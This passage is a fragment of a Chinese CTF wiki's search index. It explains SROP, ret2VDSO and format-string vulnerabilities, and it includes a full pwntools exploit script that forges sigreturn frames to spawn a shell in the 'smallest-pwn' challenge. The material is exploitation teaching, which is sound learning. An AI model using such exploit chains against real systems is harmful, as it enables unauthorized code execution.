            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5047\u8bbe\u653b\u51fb\u8005\u53ef\u4ee5\u63a7\u5236\u7528\u6237\u8fdb\u7a0b\u7684\u6808\uff0c\u90a3\u4e48\u5b83\u5c31\u53ef\u4ee5\u4f2a\u9020\u4e00\u4e2aSignal Frame\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u8fd9\u91cc\u4ee564\u4f4d\u4e3a\u4f8b\u5b50\uff0c\u7ed9\u51faSignal Frame\u66f4\u52a0\u8be6\u7ec6\u7684\u4fe1\u606f   \u5f53\u7cfb\u7edf\u6267\u884c\u5b8csigreturn\u7cfb\u7edf\u8c03\u7528\u4e4b\u540e\uff0c\u4f1a\u6267\u884c\u4e00\u7cfb\u5217\u7684pop\u6307\u4ee4\u4ee5\u4fbf\u4e8e\u6062\u590d\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u5f53\u6267\u884c\u5230rip\u65f6\uff0c\u5c31\u4f1a\u5c06\u7a0b\u5e8f\u6267\u884c\u6d41\u6307\u5411syscall\u5730\u5740\uff0c\u6839\u636e\u76f8\u5e94\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u6b64\u65f6\uff0c\u4fbf\u4f1a\u5f97\u5230\u4e00\u4e2ashell\u3002", 
            "title": "\u83b7\u53d6shell"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#system-call-chains", 
            "text": "\u9700\u8981\u6307\u51fa\u7684\u662f\uff0c\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u53ea\u662f\u5355\u72ec\u7684\u83b7\u5f97\u4e00\u4e2ashell\u3002\u6709\u65f6\u5019\uff0c\u6211\u4eec\u53ef\u80fd\u4f1a\u5e0c\u671b\u6267\u884c\u4e00\u7cfb\u5217\u7684\u51fd\u6570\u3002\u6211\u4eec\u53ea\u9700\u8981\u505a\u4e24\u5904\u4fee\u6539\u5373\u53ef   \u63a7\u5236\u6808\u6307\u9488\u3002  \u628a\u539f\u6765rip\u6307\u5411\u7684 syscall  gadget\u6362\u6210 syscall; ret  gadget\u3002   \u5982\u4e0b\u56fe\u6240\u793a \uff0c\u8fd9\u6837\u5f53\u6bcf\u6b21syscall\u8fd4\u56de\u7684\u65f6\u5019\uff0c\u6808\u6307\u9488\u90fd\u4f1a\u6307\u5411\u4e0b\u4e00\u4e2aSignal Frame\u3002\u56e0\u6b64\u5c31\u53ef\u4ee5\u6267\u884c\u4e00\u7cfb\u5217\u7684sigreturn\u51fd\u6570\u8c03\u7528\u3002", 
            "title": "system call chains"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_9", 
            "text": "\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728\u6784\u9020ROP\u653b\u51fb\u7684\u65f6\u5019\uff0c\u9700\u8981\u6ee1\u8db3\u4e0b\u9762\u7684\u6761\u4ef6   \u53ef\u4ee5\u901a\u8fc7\u6808\u6ea2\u51fa\u6765\u63a7\u5236\u6808\u7684\u5185\u5bb9  \u9700\u8981\u77e5\u9053\u76f8\u5e94\u7684\u5730\u5740  \"/bin/sh\"  Signal Frame  syscal  sigreturn    \u9700\u8981\u6709\u591f\u5927\u7684\u7a7a\u95f4\u6765\u585e\u4e0b\u6574\u4e2asigal frame   \u6b64\u5916\uff0c\u5173\u4e8esigreturn\u4ee5\u53casyscall;ret\u8fd9\u4e24\u4e2agadget\u5728\u4e0a\u9762\u5e76\u6ca1\u6709\u63d0\u53ca\u3002\u63d0\u51fa\u8be5\u653b\u51fb\u7684\u8bba\u6587\u4f5c\u8005\u53d1\u73b0\u4e86\u8fd9\u4e9bgadgets\u51fa\u73b0\u7684\u67d0\u4e9b\u5730\u5740\uff1a   \u5e76\u4e14\uff0c\u4f5c\u8005\u53d1\u73b0\uff0c\u6709\u4e9b\u7cfb\u7edf\u4e0aSROP\u7684\u5730\u5740\u88ab\u968f\u673a\u5316\u4e86\uff0c\u800c\u6709\u4e9b\u5219\u6ca1\u6709\u3002\u6bd4\u5982\u8bf4 Linux   3.3 x86_64 \uff08\u5728Debian 7.0\uff0c Ubuntu Long Term Support\uff0c CentOS 6\u7cfb\u7edf\u4e2d\u9ed8\u8ba4\u5185\u6838\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728vsyscall\u4e2d\u7684\u56fa\u5b9a\u5730\u5740\u5904\u627e\u5230syscall return\u4ee3\u7801\u7247\u6bb5\u3002\u5982\u4e0b   \u4f46\u662f\u76ee\u524d\u5b83\u5df2\u7ecf\u88ab vsyscall-emulate \u548c vdso \u673a\u5236\u4ee3\u66ff\u4e86\u3002\u6b64\u5916\uff0c\u76ee\u524d\u5927\u591a\u6570\u7cfb\u7edf\u90fd\u4f1a\u5f00\u542fASLR\u4fdd\u62a4\uff0c\u6240\u4ee5\u76f8\u5bf9\u6765\u8bf4\u8fd9\u4e9bgadgets\u90fd\u5e76\u4e0d\u5bb9\u6613\u627e\u5230\u3002  \u503c\u5f97\u4e00\u8bf4\u7684\u662f\uff0c\u5bf9\u4e8esigreturn\u7cfb\u7edf\u8c03\u7528\u6765\u8bf4\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e2d\uff0csigreturn\u7cfb\u7edf\u8c03\u7528\u5bf9\u5e94\u7684\u7cfb\u7edf\u8c03\u7528\u53f7\u4e3a15\uff0c\u53ea\u9700\u8981RAX=15\uff0c\u5e76\u4e14\u6267\u884csyscall\u5373\u53ef\u5b9e\u73b0\u8c03\u7528syscall\u8c03\u7528\u3002\u800cRAX\u5bc4\u5b58\u5668\u7684\u503c\u53c8\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u503c\u6765\u95f4\u63a5\u63a7\u5236\uff0c\u6bd4\u5982\u8bf4read\u51fd\u6570\u7684\u8fd4\u56de\u503c\u4e3a\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u3002", 
            "title": "\u540e\u7eed"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_10", 
            "text": "\u503c\u5f97\u4e00\u63d0\u7684\u662f\uff0c\u5728\u76ee\u524d\u7684pwntools\u4e2d\u5df2\u7ecf\u96c6\u6210\u4e86\u5bf9\u4e8esrop\u7684\u653b\u51fb\u3002", 
            "title": "\u5229\u7528\u5de5\u5177"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_11", 
            "text": "\u8fd9\u91cc\u4ee5360\u6625\u79cb\u676f\u4e2d\u7684smallest-pwn\u4e3a\u4f8b\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b  \u786e\u5b9a\u6587\u4ef6\u57fa\u672c\u4fe1\u606f  \u279c  smallest file smallest     \nsmallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped  \u53ef\u4ee5\u770b\u5230\u8be5\u7a0b\u5e8f\u4e3a64\u4f4d\u9759\u6001\u94fe\u63a5\u7248\u672c\u3002  \u68c0\u67e5\u4fdd\u62a4  \u279c  smallest checksec smallest     \n    Arch:     amd64-64-little\n    RELRO:    No RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)  \u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u3002  \u6f0f\u6d1e\u53d1\u73b0  \u5b9e\u7528IDA\u76f4\u63a5\u53cd\u7f16\u8bd1\u770b\u4e86\u4e00\u4e0b\uff0c\u53d1\u73b0\u7a0b\u5e8f\u5c31\u51e0\u884c\u6c47\u7f16\u4ee3\u7801\uff0c\u5982\u4e0b  public   start  start   proc   near  xor       rax ,   rax  mov       edx ,   400 h  mov       rsi ,   rsp  mov       rdi ,   rax  syscall  retn  start   endp   \u6839\u636esyscall\u7684\u7f16\u53f7\u4e3a0\uff0c\u53ef\u4ee5\u77e5\u9053\u6539\u7a0b\u5e8f\u6267\u884c\u7684\u6307\u4ee4\u4e3aread(0,$rsp,400)\uff0c\u5373\u5411\u6808\u9876\u8bfb\u5165400\u4e2a\u5b57\u7b26\u3002\u6beb\u65e0\u7591\u95ee\uff0c\u8fd9\u4e2a\u662f\u6709\u6808\u6ea2\u51fa\u7684\u3002  \u5229\u7528\u601d\u8def  \u7531\u4e8e\u7a0b\u5e8f\u4e2d\u5e76\u6ca1\u6709sigreturn\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u81ea\u5df1\u6784\u9020\uff0c\u6b63\u597d\u8fd9\u91cc\u6709read\u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7read\u51fd\u6570\u8bfb\u53d6\u7684\u5b57\u8282\u6570\u6765\u8bbe\u7f6erax\u7684\u503c\u3002\u91cd\u8981\u601d\u8def\u5982\u4e0b   \u901a\u8fc7\u63a7\u5236read\u8bfb\u53d6\u7684\u5b57\u7b26\u6570\u6765\u8bbe\u7f6eRAX\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u4ece\u800c\u6267\u884csigreturn  \u901a\u8fc7syscall\u6267\u884cexecve(\"/bin/sh\",0,0)\u6765\u83b7\u53d6shell\u3002   \u6f0f\u6d1e\u5229\u7528\u7a0b\u5e8f  from   pwn   import   *  from   LibcSearcher   import   *  small   =   ELF ( ./smallest )  if   args [ REMOTE ]: \n     sh   =   remote ( 127.0.0.1 ,   7777 )  else : \n     sh   =   process ( ./smallest )  context . arch   =   amd64  context . log_level   =   debug  syscall_ret   =   0x00000000004000BE  start_addr   =   0x00000000004000B0  ## set start addr three times  payload   =   p64 ( start_addr )   *   3  sh . send ( payload )  ## modify the return addr to start_addr+3  ## so that skip the xor rax,rax; then the rax=1  ## get stack addr  sh . send ( \\xb3 )  stack_addr   =   u64 ( sh . recv ()[ 8 : 16 ])  log . success ( leak stack addr :   +   hex ( stack_addr ))  ## make the rsp point to stack_addr  ## the frame is read(0,stack_addr,0x400)  sigframe   =   SigreturnFrame ()  sigframe . rax   =   constants . SYS_read  sigframe . rdi   =   0  sigframe . rsi   =   stack_addr  sigframe . rdx   =   0x400  sigframe . rsp   =   stack_addr  sigframe . rip   =   syscall_ret  payload   =   p64 ( start_addr )   +   a   *   8   +   str ( sigframe )  sh . send ( payload )  ## set rax=15 and call sigreturn  sigreturn   =   p64 ( syscall_ret )   +   b   *   7  sh . send ( sigreturn )  ## call execv( /bin/sh ,0,0)  sigframe   =   SigreturnFrame ()  sigframe . rax   =   constants . SYS_execve  sigframe . rdi   =   stack_addr   +   0x120    #  /bin/sh   s addr  sigframe . rsi   =   0x0  sigframe . rdx   =   0x0  sigframe . rsp   =   stack_addr  sigframe . rip   =   syscall_ret  frame_payload   =   p64 ( start_addr )   +   b   *   8   +   str ( sigframe )  print   len ( frame_payload )  payload   =   frame_payload   +   ( 0x120   -   len ( frame_payload ))   *   \\x00   +   /bin/sh \\x00  sh . send ( payload )  sh . send ( sigreturn )  sh . interactive ()   \u5176\u57fa\u672c\u6d41\u7a0b\u4e3a   \u8bfb\u53d6\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740  \u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5229\u7528\u7b2c\u4e00\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8bfb\u53d6\u5730\u5740\uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740(\u5373\u7b2c\u4e8c\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740)\u4e3a\u6e90\u7a0b\u5e8f\u7684\u7b2c\u4e8c\u6761\u6307\u4ee4\uff0c\u5e76\u4e14\u4f1a\u8bbe\u7f6erax=1  \u90a3\u4e48\u6b64\u65f6\u5c06\u4f1a\u6267\u884cwrite(1,$esp,0x400)\uff0c\u6cc4\u9732\u6808\u5730\u5740\u3002  \u5229\u7528\u7b2c\u4e09\u4e2a\u7a0b\u5e8f\u8d77\u59cb\u5730\u5740\u8fdb\u800c\u8bfb\u5165payload  \u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u8fdb\u800c\u5c06\u5411\u6808\u5730\u5740\u6240\u5728\u4f4d\u7f6e\u8bfb\u5165\u6570\u636e\uff0c\u6784\u9020execve('/bin/sh',0,0)  \u518d\u6b21\u8bfb\u53d6\u6784\u9020sigreturn\u8c03\u7528\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_12", 
            "text": "Defcon 2015 Qualifier: fuckup   \u53c2\u8003\u9605\u8bfb   Sigreturn Oriented Programming (SROP) Attack\u653b\u51fb\u539f\u7406  SROP by Angle Baby  \u7cfb\u7edf\u8c03\u7528", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#ret2vdso", 
            "text": "", 
            "title": "ret2VDSO"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#vdso", 
            "text": "\u4ec0\u4e48\u662fVDSO(Virtual Dynamically-linked Shared Object)\u5462\uff1f\u542c\u5176\u540d\u5b57\uff0c\u5927\u6982\u662f\u865a\u62df\u52a8\u6001\u94fe\u63a5\u5171\u4eab\u5bf9\u8c61\uff0c\u6240\u4ee5\u8bf4\u5b83\u5e94\u8be5\u662f\u865a\u62df\u7684\uff0c\u4e0e\u865a\u62df\u5185\u5b58\u4e00\u76f4\uff0c\u5728\u8ba1\u7b97\u673a\u4e2d\u672c\u8eab\u5e76\u4e0d\u5b58\u5728\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u662f\u5c06\u5185\u6838\u6001\u7684\u8c03\u7528\u6620\u5c04\u5230\u7528\u6237\u5730\u5740\u7a7a\u95f4\u7684\u5e93\u3002\u90a3\u4e48\u5b83\u4e3a\u4ec0\u4e48\u4f1a\u5b58\u5728\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a\u6709\u4e9b\u7cfb\u7edf\u8c03\u7528\u7ecf\u5e38\u88ab\u7528\u6237\u4f7f\u7528\uff0c\u8fd9\u5c31\u4f1a\u51fa\u73b0\u5927\u91cf\u7684\u7528\u6237\u6001\u4e0e\u5185\u6838\u6001\u5207\u6362\u7684\u5f00\u9500\u3002\u901a\u8fc7vdso\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u91cf\u51cf\u5c11\u8fd9\u6837\u7684\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u4f7f\u5f97\u6211\u4eec\u7684\u8def\u5f84\u66f4\u597d\u3002\u8fd9\u91cc\u8def\u5f84\u66f4\u597d\u6307\u7684\u662f\uff0c\u6211\u4eec\u4e0d\u9700\u8981\u4f7f\u7528\u4f20\u7edf\u7684int 0x80\u6765\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\uff0c\u4e0d\u540c\u7684\u5904\u7406\u5668\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\u6307\u4ee4   intel\u5b9e\u73b0\u4e86sysenter\uff0csysexit  amd\u5b9e\u73b0\u4e86syscall\uff0csysret   \u5f53\u4e0d\u540c\u7684\u5904\u7406\u5668\u67b6\u6784\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u6307\u4ee4\u65f6\uff0c\u81ea\u7136\u5c31\u4f1a\u51fa\u73b0\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u6240\u4ee5linux\u5b9e\u73b0\u4e86vsyscall\u63a5\u53e3\uff0c\u5728\u5e95\u5c42\u4f1a\u6839\u636e\u5177\u4f53\u7684\u7ed3\u6784\u6765\u8fdb\u884c\u5177\u4f53\u64cd\u4f5c\u3002\u800cvsyscall\u5c31\u5b9e\u73b0\u5728vdso\u4e2d\u3002  \u8fd9\u91cc\uff0c\u6211\u4eec\u987a\u4fbf\u6765\u770b\u4e00\u4e0bvdso\uff0c\u5728Linux(kernel 2.6 or upper)\u4e2d\u6267\u884cldd /bin/sh, \u4f1a\u53d1\u73b0\u6709\u4e2a\u540d\u5b57\u53eblinux-vdso.so.1(\u8001\u70b9\u7684\u7248\u672c\u662flinux-gate.so.1)\u7684\u52a8\u6001\u6587\u4ef6, \u800c\u7cfb\u7edf\u4e2d\u5374\u627e\u4e0d\u5230\u5b83, \u5b83\u5c31\u662fVDSO\u3002 \u4f8b\u5982:  \u279c  ~ ldd /bin/sh           \n    linux-vdso.so.1  =    ( 0x00007ffd8ebf2000 ) \n    libc.so.6  =  /lib/x86_64-linux-gnu/libc.so.6  ( 0x00007f84ff2f9000 ) \n    /lib64/ld-linux-x86-64.so.2  ( 0x0000560cae6eb000 )   \u9664\u4e86\u5feb\u901f\u7cfb\u7edf\u8c03\u7528\uff0cglibc\u4e5f\u63d0\u4f9b\u4e86VDSO\u7684\u652f\u6301, open(), read(), write(), gettimeofday()\u90fd\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528VDSO\u4e2d\u7684\u5b9e\u73b0\u3002\u4f7f\u5f97\u8fd9\u4e9b\u8c03\u7528\u901f\u5ea6\u66f4\u5feb\u3002 \u5185\u6838\u65b0\u7279\u6027\u5728\u4e0d\u5f71\u54cdglibc\u7684\u60c5\u51b5\u4e0b\u4e5f\u53ef\u4ee5\u66f4\u5feb\u7684\u90e8\u7f72\u3002  \u8fd9\u91cc\u6211\u4eec\u4ee5intel\u7684\u5904\u7406\u5668\u4e3a\u4f8b\uff0c\u8fdb\u884c\u7b80\u5355\u8bf4\u660e\u3002  \u5176\u4e2dsysenter\u7684\u53c2\u6570\u4f20\u9012\u65b9\u5f0f\u4e0eint 0x80\u4e00\u81f4\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u80fd\u9700\u8981\u81ea\u5df1\u5e03\u7f6e\u597d function prolog\uff0832\u4f4d\u4e3a\u4f8b\uff09  push   ebp  mov   ebp , esp   \u6b64\u5916\uff0c\u5982\u679c\u6211\u4eec\u6ca1\u6709\u63d0\u4f9bfuncttion prolog\u7684\u8bdd\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u4e00\u4e2a\u53ef\u4ee5\u8fdb\u884c\u6808\u8fc1\u79fb\u7684gadgets\uff0c\u4ee5\u4fbf\u4e8e\u53ef\u4ee5\u6539\u53d8\u6808\u7684\u4f4d\u7f6e\u3002", 
            "title": "VDSO\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_13", 
            "text": "\u5f85\u8865\u5145\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#_14", 
            "text": "Defcon 2015 Qualifier fuckup   \u53c2\u8003   http://man7.org/linux/man-pages/man7/vdso.7.html  http://adam8157.info/blog/2011/10/linux-vdso/", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#jop", 
            "text": "Jump-oriented programming", 
            "title": "JOP"
        }, 
        {
            "location": "/pwn/stackoverflow/advanced_rop/#cop", 
            "text": "Call-oriented programming", 
            "title": "COP"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_intro/", 
            "text": "\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u539f\u7406\u4ecb\u7ecd\n\n\n\u4e3a\u4e86\u4ecb\u7ecd\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\u539f\u7406\uff0c\u4f1a\u5bf9\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5229\u7528\u8fdb\u884c\u7b80\u5355\u4ecb\u7ecd\u3002\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u4ecb\u7ecd\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u53ef\u4ee5\u63a5\u53d7\u53ef\u53d8\u6570\u91cf\u7684\u53c2\u6570\uff0c\u5e76\u5c06\n\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f5c\u4e3a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u6839\u636e\u5176\u6765\u89e3\u6790\u4e4b\u540e\u7684\u53c2\u6570\n\u3002\u901a\u4fd7\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u5c31\u662f\u5c06\u8ba1\u7b97\u673a\u5185\u5b58\u4e2d\u8868\u793a\u7684\u6570\u636e\u8f6c\u5316\u4e3a\u6211\u4eec\u4eba\u7c7b\u53ef\u8bfb\u7684\u5b57\u7b26\u4e32\u683c\u5f0f\u3002\u51e0\u4e4e\u6240\u6709\u7684C/C++\u7a0b\u5e8f\u90fd\u4f1a\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6765\n\u8f93\u51fa\u4fe1\u606f\uff0c\u8c03\u8bd5\u7a0b\u5e8f\uff0c\u6216\u8005\u5904\u7406\u5b57\u7b26\u4e32\n\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5728\u5229\u7528\u7684\u65f6\u5019\u4e3b\u8981\u5206\u4e3a\u4e09\u4e2a\u90e8\u5206\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\u540e\u7eed\u53c2\u6570\uff0c\n\u53ef\u9009\n\n\n\n\n\u8fd9\u91cc\u6211\u4eec\u7ed9\u51fa\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff0c\u5176\u5b9e\u76f8\u4fe1\u5927\u591a\u6570\u4eba\u90fd\u63a5\u89e6\u8fc7printf\u51fd\u6570\u4e4b\u7c7b\u7684\u3002\u4e4b\u540e\u6211\u4eec\u518d\u4e00\u4e2a\u4e00\u4e2a\u8fdb\u884c\u4ecb\u7ecd\u3002\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\n\n\n\u5e38\u89c1\u7684\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u51fd\u6570\u6709\n\n\n\n\n\u8f93\u5165\n\n\nscanf\n\n\n\n\n\n\n\u8f93\u51fa\n\n\n\n\n\n\n\n\n\n\n\u51fd\u6570\n\n\n\u57fa\u672c\u4ecb\u7ecd\n\n\n\n\n\n\n\n\n\n\nprintf\n\n\n\u8f93\u51fa\u5230stdout\n\n\n\n\n\n\nfprintf\n\n\n\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41\n\n\n\n\n\n\nvprintf\n\n\n\u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230 stdout\n\n\n\n\n\n\nvfprintf\n\n\n\u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u6307\u5b9aFILE\u6d41\n\n\n\n\n\n\nsprintf\n\n\n\u8f93\u51fa\u5230\u5b57\u7b26\u4e32\n\n\n\n\n\n\nsnprintf\n\n\n\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u6570\u5230\u5b57\u7b26\u4e32\n\n\n\n\n\n\nvsprintf\n\n\n\u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u5230\u5b57\u7b26\u4e32\n\n\n\n\n\n\nvsnprintf\n\n\n\u6839\u636e\u53c2\u6570\u5217\u8868\u683c\u5f0f\u5316\u8f93\u51fa\u6307\u5b9a\u5b57\u8282\u5230\u5b57\u7b26\u4e32\n\n\n\n\n\n\nsetproctitle\n\n\n\u8bbe\u7f6eargv\n\n\n\n\n\n\nsyslog\n\n\n\u8f93\u51fa\u65e5\u5fd7\n\n\n\n\n\n\nerr, verr, warn, vwarn\u7b49\n\n\n\u3002\u3002\u3002\n\n\n\n\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\u8fd9\u91cc\u6211\u4eec\u4e86\u89e3\u4e00\u4e0b\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u683c\u5f0f\uff0c\u5176\u57fa\u672c\u683c\u5f0f\u5982\u4e0b\n\n\n%[parameter][flags][field width][.precision][length]type\n\n\n\u6bcf\u4e00\u79cdpattern\u7684\u542b\u4e49\u8bf7\u5177\u4f53\u53c2\u8003\u7ef4\u57fa\u767e\u79d1\u7684\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n \u3002\u4ee5\u4e0b\u51e0\u4e2apattern\u4e2d\u7684\u5bf9\u5e94\u9009\u62e9\u9700\u8981\u91cd\u70b9\u5173\u6ce8\n\n\n\n\nparameter\n\n\nn$\uff0c\u83b7\u53d6\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u6307\u5b9a\u53c2\u6570\n\n\n\n\n\n\nflag\n\n\nfield width\n\n\n\u8f93\u51fa\u7684\u6700\u5c0f\u5bbd\u5ea6\n\n\n\n\n\n\nprecision\n\n\n\u8f93\u51fa\u7684\u6700\u5927\u957f\u5ea6\n\n\n\n\n\n\nlength\uff0c\u8f93\u51fa\u7684\u957f\u5ea6\n\n\nhh\uff0c\u8f93\u51fa\u4e00\u4e2a\u5b57\u8282\n\n\nh\uff0c\u8f93\u51fa\u4e00\u4e2a\u53cc\u5b57\u8282  \u200b\n\n\n\n\n\n\ntype\n\n\nd/i\uff0c\u6709\u7b26\u53f7\u6574\u6570\n\n\nu\uff0c\u65e0\u7b26\u53f7\u6574\u6570\n\n\nx/X\uff0c16\u8fdb\u5236unsigned int \u3002x\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1bX\u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002\n\n\no\uff0c8\u8fdb\u5236unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u88650\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a1\u3002\u7cbe\u5ea6\u4e3a0\u4e14\u503c\u4e3a0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a\u3002\n\n\ns\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u8f93\u51fanull\u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411wchar_t\u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528wcrtomb \u51fd\u6570\u3002\n\n\nc\uff0c\u5982\u679c\u6ca1\u6709\u7528l\u6807\u5fd7\uff0c\u628aint\u53c2\u6570\u8f6c\u4e3aunsigned char\u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86l\u6807\u5fd7\uff0c\u628awint_t\u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684wchart_t\u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3anull\u5bbd\u5b57\u7b26\u3002\n\n\np\uff0c void *\u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002printf(\"%p\",a)\u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cfa\u7684\u503c\uff0cprintf(\"%p\", \na)\u6253\u5370\u53d8\u91cfa\u6240\u5728\u7684\u5730\u5740\u3002\n\n\nn\uff0c\u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf\u3002\n\n\n%\uff0c '\n%\n'\u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55flags, 